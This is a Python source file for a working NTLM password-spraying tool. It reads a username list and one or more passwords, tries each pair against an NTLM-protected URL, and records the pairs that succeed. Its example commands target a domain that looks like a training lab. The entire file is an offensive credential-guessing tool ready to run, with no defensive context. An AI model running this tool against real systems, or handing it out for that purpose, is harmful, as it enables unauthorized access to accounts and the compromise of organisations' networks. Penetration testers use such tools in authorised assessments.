import requests
from requests_ntlm import HttpNtlmAuth
from colorama import Fore, Style
import argparse
import time
import sys

class NTLMSprayer:
    def __init__(self, fqdn, verbose=False):
        self.fqdn = fqdn
        self.verbose = verbose
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200

    def load_users(self, userfile):
        try:
            with open(userfile, 'r') as f:
                self.users = [line.strip() for line in f]
        except FileNotFoundError:
            print(Fore.RED + f"[!] User file not found: {userfile}" + Style.RESET_ALL)
            sys.exit(1)
        if self.verbose:
            print(f"[+] Loaded {len(self.users)} users.")

    def password_spray(self, password, url, output_file=None):
        print(f"[*] Starting password spray using password: {password}")
        count = 0
        for user in self.users:
            try:
                response = requests.get(
                    url,
                    auth=HttpNtlmAuth(f"{self.fqdn}\\{user}", password),
                    timeout=5
                )
                if response.status_code == self.HTTP_AUTH_SUCCEED_CODE:
                    print(Fore.GREEN + f"[+] Valid credentials: {user}:{password}" + Style.RESET_ALL)
                    count += 1
                    if output_file:
                        with open(output_file, "a") as file:
                            file.write(f"{user}:{password}\n")
                elif self.verbose and response.status_code == self.HTTP_AUTH_FAILED_CODE:
                    print(Fore.RED + f"[-] Failed login: {user}" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"[!] Error for {user}: {e}" + Style.RESET_ALL)
        print(Fore.CYAN + f"[*] Password spray completed: {count} valid credential pair{'s' if count != 1 else ''} found" + Style.RESET_ALL)


def main():
    example_text = f"""
NTLM password spray tool

Example usage:
  python3 {sys.argv[0]} -u users.txt -f ZA.CORP.LOCAL -t http://target.local -p Welcome123
  python3 {sys.argv[0]} -u users.txt -f ZA.CORP.LOCAL -t http://target.local -P passwords.txt -o valid.txt -v
"""
    parser = argparse.ArgumentParser(
        description=example_text,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    required = parser.add_argument_group('Required Arguments')
    required.add_argument("-u", metavar="USERFILE", required=True, help="Path to the username file")
    required.add_argument("-f", metavar="FQDN", required=True, help="Fully Qualified Domain Name")
    required.add_argument("-t", metavar="TARGET", required=True, help="Target URL protected by NTLM authentication")

    password_group = required.add_mutually_exclusive_group(required=True)
    password_group.add_argument("-p", metavar="PASSWORD", help="Single password to spray")
    password_group.add_argument("-P", metavar="PASSWORDFILE", help="File containing list of passwords")

    optional = parser.add_argument_group('Optional Arguments')
    optional.add_argument("-o", metavar="OUTFILE", help="File to save valid credential pairs")
    optional.add_argument("-v", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    # Pre-check: Verify NTLM support
    try:
        response = requests.get(args.t, timeout=5)
        if "NTLM" not in response.headers.get("WWW-Authenticate", ""):
            print(Fore.YELLOW + "[!] Warning: Target does not appear to support NTLM authentication." + Style.RESET_ALL)
            sys.exit(1)
    except Exception as e:
        print(Fore.RED + f"[!] Error connecting to target URL: {e}" + Style.RESET_ALL)
        return

    sprayer = NTLMSprayer(args.f, verbose=args.v)
    sprayer.load_users(args.u)

    if args.P:
        try:
            with open(args.P, 'r') as pf:
                passwords = [line.strip() for line in pf]
        except FileNotFoundError:
            print(Fore.RED + f"[!] Password file not found: {args.P}" + Style.RESET_ALL)
            sys.exit(1)
    else:
        passwords = [args.p]

    for pwd in passwords:
        sprayer.password_spray(pwd, args.t, output_file=args.o)

if __name__ == "__main__":
    main()
